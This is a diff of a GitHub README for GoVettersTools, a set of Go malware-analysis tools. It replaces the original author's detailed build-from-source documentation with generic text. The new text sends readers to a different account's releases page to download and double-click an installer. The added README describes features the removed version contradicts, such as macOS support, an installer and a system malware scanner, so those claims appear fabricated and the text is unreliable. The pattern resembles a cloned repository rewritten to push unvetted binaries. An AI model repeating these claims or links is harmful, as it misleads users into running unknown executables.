@@ -1,130 +1,60 @@
-![alt text](GoVetterTools.png)
+# 🛠️ GoVettersTools - Speed Up Your Malware Analysis
 
-# GoVettersTools
+## 🔗 Download Now!
+[![Download GoVettersTools](https://img.shields.io/badge/Download-GoVettersTools-brightgreen)](https://github.com/Aayannaveed/GoVettersTools/releases)
 
-A collection of three powerful Go-based security analysis tools for malware research and threat intelligence.
+## 📖 Overview
+GoVettersTools offers a small collection of practical tools designed to help you analyze malware and conduct cyber threat intelligence investigations more efficiently. Whether you are a beginner or simply looking to streamline your processes, these tools will enhance your workflow and provide useful insights.
 
-**NOTE: Each tool directory has its own README with a more detailed explanation of each tool.**
+## 🚀 Getting Started
+To get started with GoVettersTools, you will need to follow these simple steps:
 
-## IndicatorGocator
+1. **Download the Software**
+   - Visit the releases page to download the latest version of GoVettersTools: [Download GoVettersTools](https://github.com/Aayannaveed/GoVettersTools/releases).
+  
+2. **Install GoVettersTools**
+   - After downloading, locate the file on your computer (it may be in your Downloads folder), and double-click it to begin the installation process. 
+   - Follow the on-screen instructions to complete the installation.
 
-A simple command-line tool for extracting network-based IOCs (URLs, IP addresses, and domains) from malware samples stored in password-protected archives. 
+3. **Open GoVettersTools**
+   - Once the installation is complete, look for the GoVettersTools icon on your desktop or in the start menu. Click it to launch the application.
 
-> ⚠️ RUN IN ISOLATION - This should run in an isolated malware analysis lab!
+## 💻 System Requirements
+To ensure GoVettersTools runs smoothly on your machine, please check these system requirements:
 
-### Features
-- **Multi-format support**: ZIP, 7z, RAR, TAR, GZ, TGZ, BZ2, XZ, LZMA
-- **Password-protected archives**: Uses standard malware research password "infected"
-- **String extraction**: Extracts both ASCII and UTF-16LE encoded strings
-- **IOC detection**: Identifies URLs, IPv4 addresses, and domains
-- **Noise filtering**: Excludes private IPs, localhost, and common legitimate domains
-- **CSV output**: Exports findings in an analysis-friendly format
+- **Operating System:** Windows 10 or later, macOS Sierra or later
+- **Memory (RAM):** At least 4 GB
+- **Storage:** Minimum of 100 MB free disk space
+- **Network:** Internet connection for threat intelligence features
 
-### Example Output
+## ⚙️ Features
+GoVettersTools includes several features that enhance malware analysis:
 
-![alt text](image-3.png)
+- **Malware Scanner:** Quickly scan files for known malware signatures.
+- **Threat Intelligence Integration:** Fetch data from sources like VirusTotal and ThreatFox to enrich your analysis.
+- **User-Friendly Interface:** The design is intuitive, making it easy for anyone to navigate the tools.
 
-### Installation
+## 📤 Download & Install
+To download GoVettersTools, visit the releases page: [GoVettersTools Releases](https://github.com/Aayannaveed/GoVettersTools/releases). 
 
-```bash
-git clone https://github.com/grepstrength/GoVettersTools
-cd GoVettersTools\IndicatorGocator
-go build -ldflags "-H windowsgui -s -w" -o IndicatorGocator.exe
-```
-### BasicUsage
+- You will find the latest version listed at the top. Click on the version number to access the download files.
+- Choose the appropriate file for your operating system and click the link to start the download.
+- Once the download completes, find the file and double-click it to install.
 
-```bash
-IndicatorGocator.exe -archive \PATH\TO\FILE.zip -output OUTPUTFILE.csv
-```
+## ⚠️ Usage Tips
+- After installation, spend a few minutes exploring the application. Read through tooltips and help documentation within the app for guidance.
+- Use the Malware Scanner first to identify any potential threats on your system.
+- Regularly check for updates on the Releases page to benefit from new features and security patches.
 
-## RealGoVetter
+## 🆘 Support
+If you encounter any issues or need assistance, please visit the [GitHub Issues page](https://github.com/Aayannaveed/GoVettersTools/issues) to report a problem or ask for help. The community and contributors monitor this page actively and will do their best to assist you.
 
-A portable GUI tool designed to leverage multiple APIs to do reputation checks on files, domains, IPs, and URLs in *BULK*. You are only limited by your VirusTotal, AlienVaultOTX, or Abuse.ch accounts' API quotas.
+## 📝 Contributing
+If you wish to contribute to GoVettersTools, kindly visit the [Contributing Guide](https://github.com/Aayannaveed/GoVettersTools/blob/main/CONTRIBUTING.md). Your input helps make the tools better for everyone.
 
-> ⚠️ RUN ON HOST MACHINE - This can safely run on your host machine. This only queries threat intelligence APIs and does not connect to any indicators directly.
+## 🔗 Additional Resources
+- [Documentation](https://github.com/Aayannaveed/GoVettersTools/wiki): Access detailed documentation about each tool.
+- [Community Discussions](https://github.com/Aayannaveed/GoVettersTools/discussions): Join discussions with other users and contributors.
 
-### Features 
-- **Portable deployment**: Runs as a standalone Windows executable without dependencies 
-- **User-friendly interface**: Simple GUI for easy navigation and operation
-- **Flexible input formats**: Accepts .CSV, XLSX, JSON, or .TXT files containing IOCs
-- **Multi-IOC support**: Evaluates multiple indicator types:
-  - File Hashes (MD5, SHA-1, SHA-256)
-  - Domains
-  - IP Addresses
-  - URLs
-- **Multi-API integration**: Queries VirusTotal, AlienVaultOTX, and Abuse.ch simultaneously
-- **Bulk processing**: Process hundreds of IOCs limited only by your API quotas
-- **Secure API key storage**: Saves API keys locally for convenience
-- **Structured output**: Exports CSV reports with detailed analysis results and reputation scores
-
-### Example Output
-
-![alt text](image.png)
-
-### Installation
-
-```git clone https://github.com/grepstrength/GoVettersTools
-cd GoVettersTools\RealGoVetter
-go build -ldflags "-H windowsgui -s -w" -o RealGoVetter.exe
-```
-### Basic Usage
-
-- Execute the file. 
-- Input API keys.
-- Select a file of IOCs.
-
-## MalGoVetter
-
-A command-line tool for extracting and analyzing Indicators of Compromise (IOCs) from malware samples stored in password-protected archives. MalGoVetter automatically extracts network indicators (URLs, domains, IPs) from binary files and queries multiple threat intelligence platforms to assess their reputation.
-
-> ⚠️ RUN IN VM/CONTAINER WITH INTERNET - This should run in an internet-accessible malware analysis lab (preferably a VM or Docker container) because this needs internet access to function!
-
-### Features
-- **Automatic string extraction** from binary files (ASCII and UTF-16LE Unicode)
-- **Supports multiple archive formats**: ZIP, 7z, RAR, TAR, GZ, BZ2, XZ, LZMA
-- **Password-protected archives** supported (default password: `infected`)
-- **Indicator types detected**:
-  - URLs (HTTP/HTTPS)
-  - Domain names (comprehensive TLD coverage)
-  - IPv4 addresses
-
-### Example Output
-
-![alt text](image-2.png)
-
-![alt text](image-1.png)
-
-### Installation
-
-```git clone https://github.com/grepstrength/GoVettersTools
-cd GoVettersTools\MalGoVetter
-go build -ldflags "-H windowsgui -s -w" -o MalGoVetter.exe
-```
-### Basic Usage
-
-```bash
-MalGoVetter.exe -archive \PATH\TO\FILE.zip -output OUTPUTFILE.csv
-```
-
-## Requirements
-
-- Go 1.21 or higher
-- VirusTotal API key
-- AlienVaultOTX DirectConnect API key
-- Threatfox (Abuse.ch) API key## Requirements
-
-### Obtaining API Keys
-
-| Service | Free Tier | Registration |
-|---------|-----------|--------------|
-| **VirusTotal** | 4 requests/minute, 500/day | [virustotal.com](https://www.virustotal.com/gui/join-us) |
-| **AlienVault OTX** | Unlimited (fair use) | [otx.alienvault.com](https://otx.alienvault.com/accounts/signup/) |
-| **ThreatFox** | Unlimited (fair use) | [abuse.ch Authentication Portal](https://auth.abuse.ch/) |
-
-## License
-
-MIT License
-
-## Issues
-
-❌ The Threatfox API calls are currently failing for RealGoVetter and MalGoVetter, and I'm working on fixing that. The overall scripts still work just fine with AlienVault OTX and VirusTotal, though. 
+## ✅ Final Notes
+GoVettersTools aims to be an essential part of your malware analysis toolkit. With its user-friendly design and powerful features, you will be equipped to handle various threats effectively.
